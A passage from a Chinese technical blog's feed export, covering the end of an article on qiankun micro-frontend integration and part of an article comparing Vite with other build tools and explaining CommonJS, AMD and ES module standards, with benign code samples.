class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><br />主应用接收</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import &#123; HandlePagerMessage, PagerCollect, PagerIssue, PagerMessage &#125; from &quot;@/core/app.pager&quot;;</span><br><span class="line">import &#123; defineComponent, inject, onMounted &#125; from &#x27;vue&#x27;;</span><br><span class="line"></span><br><span class="line">export default defineComponent(&#123;</span><br><span class="line">    name: &#x27;DevPage&#x27;,</span><br><span class="line">    setup(props,&#123; slots &#125;) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        onMounted(async () =&gt; &#123;</span><br><span class="line"></span><br><span class="line">            PagerCollect.subscribe((msg: PagerMessage) =&gt; &#123;</span><br><span class="line">                if (msg) &#123;</span><br><span class="line">                    console.log(&#x27;接收到子应用上报的消息 : &#x27;, msg.data);</span><br><span class="line"></span><br><span class="line">                    HandlePagerMessage(msg.data);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        return () =&gt; (</span><br><span class="line">          &lt;&gt;&lt;h1&gt;主应用接收示例&lt;/h1&gt;&lt;/&gt;</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><a name="gXTAN"></a></p><h3 id="应用跳转"><a href="#应用跳转" class="headerlink" title="应用跳转"></a>应用跳转</h3><p><br />子应用内部跳转与日常开发方式跳转一样, vue 环境可以通过<code>router</code>方法跳转, angular 环境可以通过<code>this.router.navigateByUrl</code>, react 可以通过<code>navigate</code>对象跳转<br />应用间跳转可以通过<code>history.pushState</code>实现应用间跳转<br />为了实现路由事件的统一处理,通常可以在各子应用需要跳转时,通过消息通知方式告诉主应用, 由主应用统一进行跳转操作</p><p><a name="b2zXj"></a></p><h3 id="子应用切换-Loading-的处理"><a href="#子应用切换-Loading-的处理" class="headerlink" title="子应用切换 Loading 的处理"></a>子应用切换 Loading 的处理</h3><p>应用程序加载我们可以通过主应用的加载状态进行处理,各自的子应用也可以进行各自的 loading 监测.<br />在主应用执行加载子应用未完成初始化阶段我们可以将<code>loading</code>的状态挂载到主应用的<code>app</code>下.各子应用在获取<code>props</code>时可以获取到该<code>loading</code>状态进行相关状态展示.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// 封装渲染函数</span><br><span class="line">const loader = (loading: boolean) =&gt; render(&#123; loading &#125;);</span><br><span class="line">const render = (props: any) =&gt; &#123;</span><br><span class="line">    const &#123; appContent, loading &#125; = props;</span><br><span class="line">    if (!app) &#123;</span><br><span class="line"></span><br><span class="line">        app = createApp(App);</span><br><span class="line"></span><br><span class="line">        // mount</span><br><span class="line">        router.isReady().then(() =&gt; &#123;</span><br><span class="line"></span><br><span class="line">            app.mount(&#x27;#app&#x27;, true);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        // 这里挂载loading</span><br><span class="line">        app.content = appContent;</span><br><span class="line">        app.loading = loading;</span><br><span class="line">        updateApp(app);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 主应用渲染</span><br><span class="line">render(&#123; loading: true &#125;);</span><br></pre></td></tr></table></figure><p><a name="PPxQ8"></a></p><h3 id="抽离公共代码"><a href="#抽离公共代码" class="headerlink" title="抽离公共代码"></a>抽离公共代码</h3><p>这里说的很明确,不再赘述.<a href="https://github.com/umijs/qiankun/issues/627">https://github.com/umijs/qiankun/issues/627</a></p><p><a name="LhZhT"></a></p><h2 id="微服务部署"><a href="#微服务部署" class="headerlink" title="微服务部署"></a>微服务部署</h2><ol><li>部署到同一服务器</li></ol><p>如果服务器数量有限，或不能跨域等原因需要把主应用和微应用部署在一起。通常的做法是主应用部署在一级目录，微应用部署在二&#x2F;三级目录。但是这样做会增加同一域名下的并发数量, 影响页面加载效率. 另外所有子应用都在一个根目录下, 不方便文件相关的操作.</p><ol start="2"><li>部署到不同服务器</li></ol><p>第二种方案主微应用部署在不同的服务器，使用 Nginx 代理进行访问。一般这么做是因为不允许主应用跨域访问微应用。具体思路是将主应用服务器上一个特殊路径的请求全部转发到微应用的服务器上，即通过代理实现“微应用部署在主应用服务器上”的效果。</p><p><a name="hJB0E"></a></p><h2 id="架构演变"><a href="#架构演变" class="headerlink" title="架构演变"></a>架构演变</h2><p>通过本次实践,不禁联想到近些年的前端架构演变, 从 web1.0 到今天的 mvvm 与微服务化, 带来了太多的改变.<br />简单整理下架构相关的演变历程.</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/26114887/1644561554249-53dcbe8e-0612-487e-8b1c-6e61d3043de9.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/26114887/1644561554249-53dcbe8e-0612-487e-8b1c-6e61d3043de9.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="NuD0l"></a></p><h2 id="项目中遇到的问题"><a href="#项目中遇到的问题" class="headerlink" title="项目中遇到的问题"></a>项目中遇到的问题</h2><ol><li>加载子应用失败</li></ol><p>这类问题在刚刚接入微服务进行调试时是经常遇到的，其原因也有很多，官网也给出了一部分可能出现原因。首先我么要确主应用正确的注册了相关子应用，并设置了需要挂在的 DOM 节点，同时也要保证接入的子应用导出了符合规范的生命周期钩子，在满足了这些基本的条件之后仍然加载失败，我们就需要根据具体的报错信息进行定位。可能的涉及原因：<br />a. 本地服务器没有设置 CORS 导致 JS 资源无法加载<br /> b. 子应用自身存在语法错误，我们可以先单独运行子应用来排除此类问题<br /> c. 如果使用了二级路由进行挂在，可能存在二级路由规则设置问题</p><ol start="2"><li>子应用的图片无法展示</li></ol><p>导致图片无法展示或者一些页面引用的资源 404 问题，通常都是浏览器默认了当前子应用的资源在当前主应用域名下。在 webpack 打包的项目中我们通过设置<code>__webpack_public_path__</code>来处理资源问题，在 Angular 框架中我么通过设置统一的管道处理当前资源的引入问题。</p><ol start="3"><li>无法通过 rxjs 实现应用间通讯</li></ol><p>可能存在 rxjs 版本过高问题，可以参考本文的示例源码使用。</p><ol start="4"><li>找不到子应用路由</li></ol><p>在确保应用的接入环节没有问题后，我们可以在控制台看到对应的资源加载情况。当子应用的资源正确加载后页面仍没有呈现子应用的内容，极大的可能是在子应用中没有添加针对微服务状态下的路由配置，如何判断子应用是在独立状态访问还在运行在微服务框架下？qiankun 为我们提供了<code>window.__POWERED_BY_QIANKUN__</code>这样的变量用来区分，这样我们就可以在注册子应用路由时候设置路由相关的 base 变量了。</p><p><a name="pch4s"></a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote><p><em>注：主应用加载子应用时，子应用必须支持跨域加载</em></p></blockquote><p>由于 qiankunshi 采用 HTML Entry，localStrage、cookie 可共享, 一些通过主应用保存在本地存储的信息在自应用中可以直接获取到.本文只是对 qiankun 的使用上做了一个基本的介绍, 并对不同技术框架的接入做了基础实践. 未涉及到性能优化、权限集成、依赖共享、版本管理、团队协作、发布策略、监控等.</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/26114887/1644561563922-bf1f6681-0ae0-47b9-9e21-e2422db3f4bc.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/26114887/1644561563922-bf1f6681-0ae0-47b9-9e21-e2422db3f4bc.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>本文示例源码：<a href="https://github.com/gfe-team/qiankunapp">https://github.com/gfe-team/qiankunapp</a><br />参考链接：<br /><a href="https://qiankun.umijs.org/">https://qiankun.umijs.org/</a><br /><a href="https://single-spa.js.org/docs/ecosystem-angular/">https://single-spa.js.org/docs/ecosystem-angular/</a><br /><a href="https://micro-frontends.org/">https://micro-frontends.org/</a><br /><a href="https://zhuanlan.zhihu.com/p/95085796">https://zhuanlan.zhihu.com/p/95085796</a><br /><a href="https://tech.meituan.com/2020/02/27/meituan-waimai-micro-frontends-practice.html">https://tech.meituan.com/2020/02/27/meituan-waimai-micro-frontends-practice.html</a><br /><a href="https://xiaomi-info.github.io/2020/04/14/fe-microfrontends-practice/">https://xiaomi-info.github.io/2020/04/14/fe-microfrontends-practice/</a></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 解决方案 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 微前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>构建工具对比与模块化规范</title>
      <link href="/2024/04/15/frontend/engineering/gou-jian-gong-ju-dui-bi-yu-mo-kuai-hua-gui-fan/"/>
      <url>/2024/04/15/frontend/engineering/gou-jian-gong-ju-dui-bi-yu-mo-kuai-hua-gui-fan/</url>
      
        <content type="html"><![CDATA[<p><a name="JSA1R"></a></p><h2 id="前端工程的痛点"><a href="#前端工程的痛点" class="headerlink" title="前端工程的痛点"></a>前端工程的痛点</h2><p><a name="LFSOv"></a></p><h3 id="前端的模块化需求"><a href="#前端的模块化需求" class="headerlink" title="前端的模块化需求"></a>前端的模块化需求</h3><p>前端业界的模块标准非常多，包括 ESM、CommonJS、AMD 和 CMD 等等。<br />前端工程一方面需要落实这些模块规范，<strong>保证模块正常加载</strong>。<br />另一方面需要兼容不同的模块规范，以<strong>适应不同的执行环境</strong>。<br><a name="V8Wfx"></a></p><h3 id="兼容浏览器，编译高级语法"><a href="#兼容浏览器，编译高级语法" class="headerlink" title="兼容浏览器，编译高级语法"></a>兼容浏览器，编译高级语法</h3><p>由于浏览器的实现规范所限，只要<strong>高级语言&#x2F;语法（TypeScript、 JSX 等）想要在浏览器中正常运行，就必须被转化为浏览器可以理解的形式</strong>。这都需要工具链层面的支持，而且这个需求会一直存在。<br><a name="Rah6s"></a></p><h3 id="线上代码的质量问题"><a href="#线上代码的质量问题" class="headerlink" title="线上代码的质量问题"></a>线上代码的质量问题</h3><p>和开发阶段的考虑侧重点不同，生产环境中，我们不仅要考虑代码的安全性、兼容性问题，保证线上代码的正常运行，也需要考虑代码运行时的<strong>性能问题</strong>。<br />由于浏览器的版本众多，代码兼容性和安全策略各不相同，线上代码的质量问题也将是前端工程中长期存在的一个痛点。<br><a name="VGLX2"></a></p><h3 id="开发效率"><a href="#开发效率" class="headerlink" title="开发效率"></a>开发效率</h3><p>开发效率也不容忽视。我们知道，<strong>项目的冷启动&#x2F;二次启动时间</strong>、<strong>热更新时间</strong>都可能严重影响开发效率，尤其是当项目越来越庞大的时候。因此，提高项目的<strong>启动速度</strong>和<strong>热更新速度</strong>也是前端工程的重要需求。</p><p><a name="guSIS"></a></p><h2 id="前端构建工具如何解决痛点"><a href="#前端构建工具如何解决痛点" class="headerlink" title="前端构建工具如何解决痛点"></a>前端构建工具如何解决痛点</h2><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695016726845-3464853e-8644-4331-9f04-56786fb99397.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/webp/34869350/1695016726845-3464853e-8644-4331-9f04-56786fb99397.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><ul><li><strong>模块化方面，</strong>提供模块加载方案，并兼容不同的模块规范。</li><li><strong>语法转译方面，</strong>配合 Sass、TSC、Babel 等前端工具链，完成高级语法的转译功能，同时对于静态资源也能进行处理，使之能作为一个模块正常加载。</li><li><strong>产物质量方面，</strong>在生产环境中，配合 Terser 等压缩工具进行代码压缩和混淆，通过 Tree Shaking 删除未使用的代码，提供对于低版本浏览器的语法降级处理等等。</li><li><strong>开发效率方面，</strong>构建工具本身通过各种方式来进行性能优化，包括使用原生语言 Go&#x2F;Rust、no-bundle 等等思路，提高项目的启动性能和热更新的速度。<br><a name="pv0Mc"></a></li></ul><h2 id="Vite-为什么是当前最高效的构建工具"><a href="#Vite-为什么是当前最高效的构建工具" class="headerlink" title="Vite 为什么是当前最高效的构建工具"></a>Vite 为什么是当前最高效的构建工具</h2><p>到底哪个工具更好用？或者说，哪个工具解决前端工程痛点的效果更好？<br />The State of JavaScript Survey 最近的调查结果中显示， Vite 在全球开发者中的满意度超过 98%，已经被用到了 SvelteKit、Astro 这些大型框架中，成为当下最受瞩目的前端构建工具。我也最推荐你使用它。为什么是 Vite 呢？我们可以根据上面说的四个维度来审视它。</p><p><a name="h2Fop"></a></p><h3 id="开发效率-1"><a href="#开发效率-1" class="headerlink" title="开发效率"></a>开发效率</h3><p>开发效率方面，传统构建工具普遍的缺点就是太慢了，与之相比，Vite 能将项目的启动性能提升一个量级，并且达到毫秒级的瞬间热更新效果。<br />拿 Webpack 来对比能发现，一般的项目使用 Webpack 之后，启动花个几分钟都是很常见的事情，热更新也经常需要等待十秒以上。这主要是因为：</p><ul><li>项目冷启动时必须递归打包整个项目的依赖树</li><li>JavaScript 语言本身的性能限制，导致构建性能遇到瓶颈，直接影响开发效率</li></ul><p>这样一来，代码改动后不能立马看到效果，自然开发体验也越来越差。<br />而其中，最占用时间的就是<strong>代码打包</strong>和<strong>文件编译</strong>。</p><p>而 <strong>Vite 很好地解决了这些问题</strong>。</p><ul><li>一方面，Vite 在开发阶段基于浏览器原生 ESM 的支持实现了 no-bundle 服务</li><li>另一方面，借助 Esbuild 超快的编译速度来做第三方库构建和 TS&#x2F;JSX 语法编译，从而能够有效提高开发效率。</li></ul><p><a name="oafV8"></a></p><h3 id="模块化方面"><a href="#模块化方面" class="headerlink" title="模块化方面"></a>模块化方面</h3><p>Vite 基于浏览器原生 ESM 的支持实现模块加载，并且无论是开发环境还是生产环境，都可以将其他格式（如 CommonJS）的产物转换为 ESM。</p><p><a name="Bu0Xv"></a></p><h3 id="语法转译方面"><a href="#语法转译方面" class="headerlink" title="语法转译方面"></a>语法转译方面</h3><p>语法转译方面，Vite 内置了对 TypeScript、JSX、Sass 等高级语法的支持，也能够加载各种各样的静态资源，如图片、Worker 等等。</p><p><a name="LWTFe"></a></p><h3 id="产物质量"><a href="#产物质量" class="headerlink" title="产物质量"></a>产物质量</h3><p>产物质量方面，Vite 基于成熟的打包工具 Rollup 实现生产环境打包，同时可以配合 Terser、Babel 等工具链一起，极大程度保证构建产物的质量。</p><p><a name="iGTKU"></a></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>Vite 将会是你当下的一个最好的选择。它<strong>不仅解决了传统构建工具的开发效率问题</strong>，<strong>而且具备一个优秀构建工具的各项要素</strong>，<strong>还经历了社区大规模的验证与落地</strong>。</p><p><a name="V5Jz9"></a></p><h2 id="使用-Vite-过程产生的问题"><a href="#使用-Vite-过程产生的问题" class="headerlink" title="使用 Vite 过程产生的问题"></a>使用 Vite 过程产生的问题</h2><p>对生态了解不够，不知道使用哪些插件或者解决方案</p><ul><li>第三方库里面含有 CommonJS 代码导致报错了怎么办?</li><li>想在开发过程中进行 Eslint 代码规范检查怎么办？</li><li>生产环境打包项目后，如何产出构建产物分析报告？</li><li>如果要兼容不支持原生 ESM 的浏览器，怎么办？</li></ul><p>对 Vite 底层使用的构建引擎 Esbuild 和 Rollup 不够熟悉，遇到一些需要定制的场景时</p><ul><li>写一个 Esbuild 插件来处理一下问题依赖</li><li>对于 Rollup 打包产物进行自定义拆包，解决实际场景中经常出现的循环依赖问题</li><li>使用 Esbuild 的代码转译和压缩功能会出现哪些兼容性问题？如何解决？</li></ul><p>当然，作为一个构建工具，Vite 的难点不仅在于它本身的灵活性，也包含了诸如 Babel、core-js 等诸多前端工具链的集成和应用</p><ul><li>@babel&#x2F;preset-env 的 useBuiltIns 属性各个取值有哪些区别？</li><li>@babel&#x2F;polyfill 与 @babel&#x2F;runtime-corejs 有什么区别？</li><li>@babel&#x2F;plugin-transform-runtime 与@babel&#x2F;preset-env 的 useBuiltIn 相比有什么优化？</li><li>core-js 的作用是什么？其产物有哪些版本？core-js 和 core-js-pure 有什么区别？</li></ul><p><a name="X4m8O"></a></p><h2 id="ESM-为什么是前端模块化的未来"><a href="#ESM-为什么是前端模块化的未来" class="headerlink" title="ESM 为什么是前端模块化的未来"></a>ESM 为什么是前端模块化的未来</h2><p>自 2009 年 Node.js 诞生，前端先后出现了 CommonJS、AMD、CMD、UMD 和 ES Module 等模块规范<br />底层规范的发展也催生出了一系列工具链的创新，比如：</p><ul><li>AMD 规范提出时社区诞生的模块加载工具 requireJS</li><li>基于 CommonJS 规范的模块打包工具 browserify</li><li>能让用户提前用上 ES Module 语法的 JS 编译器 Babel</li><li>兼容各种模块规范的重量级打包工具 Webpack 以及基于浏览器原生 ES Module 支持而实现的 <strong>no-bundle</strong> 构建工具 Vite 等等。</li></ul><p><a name="UwN6s"></a></p><h3 id="前端模块化的演进过程"><a href="#前端模块化的演进过程" class="headerlink" title="前端模块化的演进过程"></a>前端模块化的演进过程</h3><p>了解前端模块化的演进过程，才能更清楚地了解到各种模块化标准诞生的背景和意义，也能更好地理解 ES Module 为什么能够成为现今最主流的前端模块化标准。<br><a name="PQBAt"></a></p><h4 id="无模块化标准阶段"><a href="#无模块化标准阶段" class="headerlink" title="无模块化标准阶段"></a>无模块化标准阶段</h4><p>模块化标准还没有诞生的时候，前端界已经产生了一些模块化的开发手段：</p><ol><li>文件划分</li><li>命名空间</li><li>IIFE 私有作用域</li></ol><p>这几种方式都没有真正解决一个问题——<strong>模块加载</strong>。如果模块间存在依赖关系，那么 script 标签的加载顺序就需要受到严格的控制，一旦顺序不对，则很有可能产生运行时 Bug<br><a name="TATua"></a></p><h4 id="业界主流的三大模块规范"><a href="#业界主流的三大模块规范" class="headerlink" title="业界主流的三大模块规范"></a>业界主流的三大模块规范</h4><p><a name="XEJ9f"></a></p><h5 id="CommonJS"><a href="#CommonJS" class="headerlink" title="CommonJS"></a>CommonJS</h5><p>CommonJS 是业界最早正式提出的 JavaScript 模块规范，主要用于服务端，随着 Node.js 越来越普及，这个规范也被业界广泛应用。<br />对于模块规范而言，一般会包含 2 方面内容：</p><ul><li>统一的模块化代码规范</li><li>实现自动加载模块的加载器（也称为 loader）</li></ul><p>示例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// module-a.js</span></span><br><span class="line"><span class="keyword">var</span> data = <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getData</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  getData,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// index.js</span></span><br><span class="line"><span class="keyword">const</span> &#123; getData &#125; = <span class="built_in">require</span>(<span class="string">&quot;./module-a.js&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">getData</span>());</span><br></pre></td></tr></table></figure><p>代码中使用 require 来导入一个模块，用 module.exports 来导出一个模块。这个过程实际上 Node.js 内部会有相应的 loader 转译模块代码，最后模块代码会被处理成下面这样：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span> (<span class="params"><span class="built_in">exports</span>, <span class="built_in">require</span>, <span class="variable language_">module</span>, __filename, __dirname</span>) &#123;</span><br><span class="line">  <span class="comment">// 执行模块代码</span></span><br><span class="line">  <span class="comment">// 返回 exports 对象</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>对于 CommonJS 而言，一方面它定义了一套完整的模块化代码规范，另一方面 Node.js 为之实现了自动加载模块的 loader，看上去是一个很不错的模块规范。<br />但也存在一些问题：</p><ul><li><strong>模块加载器由 Node.js 提供，太过依赖 Node.js 本身的功能实现。</strong>比如文件系统，如果 CommonJS 模块直接放到浏览器中是无法执行的。当然, 业界也产生了 <a href="https://link.juejin.cn/?target=https://github.com/browserify/browserify">browserify</a> 这种打包工具来支持打包 CommonJS 模块，从而顺利在浏览器中执行，相当于社区实现了一个第三方的 loader。</li><li><strong>CommonJS 本身约定以同步的方式进行模块加载</strong>。这种加载机制放在服务端是没问题的，一来模块都在本地，不需要进行网络 IO，二来只有服务启动时才会加载模块，而服务通常启动后会一直运行，所以对服务的性能并没有太大的影响。但如果这种加载机制放到浏览器端，会带来明显的性能问题。它会产生大量同步的模块请求，浏览器要等待响应返回后才能继续解析模块。也就是说，<strong>模块请求会造成浏览器 JS 解析过程的阻塞</strong>，导致页面加载速度缓慢。</li></ul><p>总之，CommonJS 是一个不太适合在浏览器中运行的模块规范。因此，业界也设计出了全新的规范来作为浏览器端的模块标准，最知名的要数 AMD 了。</p><p><a name="vVqfs"></a></p><h5 id="AMD"><a href="#AMD" class="headerlink" title="AMD"></a>AMD</h5><p>AMD 全称为 Asynchronous Module Definition，即<strong>异步模块定义规范</strong>。<br />模块根据这个规范，在浏览器环境中会被异步加载，而不会像 CommonJS 规范进行同步加载，也就不会产生同步请求导致的浏览器解析过程阻塞的问题了。<br />我们先来看看这个模块规范是如何来使用的：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.js</span></span><br><span class="line"><span class="title function_">define</span>([<span class="string">&quot;./print&quot;</span>], <span class="keyword">function</span> (<span class="params">printModule</span>) &#123;</span><br><span class="line">  printModule.<span class="title function_">print</span>(<span class="string">&quot;main&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// print.js</span></span><br><span class="line"><span class="title function_">define</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">print</span>: <span class="keyword">function</span> (<span class="params">msg</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;print &quot;</span> + msg);</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在 AMD 规范当中，我们可以通过 define 去定义或加载一个模块，比如上面的 main 模块和 print 模块，如果模块需要导出一些成员需要通过在定义模块的函数中 return 出去（参考 print 模块），如果当前模块依赖了一些其它的模块则可以通过 define 的第一个参数来声明依赖（参考 main 模块），这样模块的代码执行之前浏览器会先加载依赖模块。<br />由于没有得到浏览器的原生支持，AMD 规范需要由第三方的 loader 来实现，最经典的就是 <a href="https://link.juejin.cn/?target=https://github.com/requirejs/requirejs">requireJS</a> 库了，它完整实现了 AMD 规范，至今仍然有不少项目在使用。<br />不过 AMD 规范使用起来稍显复杂，代码阅读和书写都比较困难。因此，这个规范并不能成为前端模块化的终极解决方案，仅仅是社区中提出的一个妥协性的方案，关于新的模块化规范的探索，业界从仍未停止脚步。<br />同期出现的规范当中也有 CMD 规范，这个规范是由淘宝出品的 SeaJS 实现的，解决的问题和 AMD 一样。不过随着社区的不断发展，SeaJS 已经被 requireJS 兼容了。<br />当然，你可能也听说过 UMD（Universal Module Definition）规范，其实它并不算一个新的规范，只是兼容 AMD 和 CommonJS 的一个模块化方案，可以同时运行在浏览器和 Node.js 环境。</p><blockquote><p>顺便提一句，后面将要介绍的 ES Module 也具备这种跨平台的能力。</p></blockquote><p><a name="TaQmo"></a></p><h5 id="ES6-Module"><a href="#ES6-Module" class="headerlink" title="ES6 Module"></a>ES6 Module</h5><p>ES6 Module 也被称作 ES Module 或 ESM， 是由 ECMAScript 官方提出的模块化规范，作为一个官方提出的规范，ES Module 已经得到了现代浏览器的内置支持。<br />在现代浏览器中，如果在 HTML 中加入含有 <code>type=&quot;module&quot;</code> 属性的 script 标签，那么浏览器会按照 ES Module 规范来进行依赖加载和模块解析，<strong>这也是 Vite 在开发阶段实现 no-bundle 的原因</strong>，<strong>由于模块加载的任务交给了浏览器，即使不打包也可以顺利运行模块代码</strong>，具体的模块加载流程我们会在下一节进行详细的解释。</p><p>大家可能会担心 ES Module 的兼容性问题，其实 ES Module 的浏览器兼容性如今已经相当好了，覆盖了 90% 以上的浏览器份额。</p><p>不仅如此，一直以 CommonJS 作为模块标准的 Node.js 也紧跟 ES Module 的发展步伐，从 12.20 版本开始<a href="https://link.juejin.cn/?target=https://nodejs.org/api/esm.html%23modules-ecmascript-modules">正式支持</a>原生 ES Module。也就是说，<strong>如今 ES Module 能够同时在浏览器与 Node.js 环境中执行，拥有天然的跨平台能力。</strong></p><p>下面是一个使用 ES Module 的简单例子：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; methodA &#125; <span class="keyword">from</span> <span class="string">&quot;./module-a.js&quot;</span>;</span><br><span class="line"><span class="title function_">methodA</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//module-a.js</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">methodA</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> &#123; methodA &#125;;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;icon&quot;</span> <span class="attr">type</span>=<span class="string">&quot;image/svg+xml&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/src/favicon.svg&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span 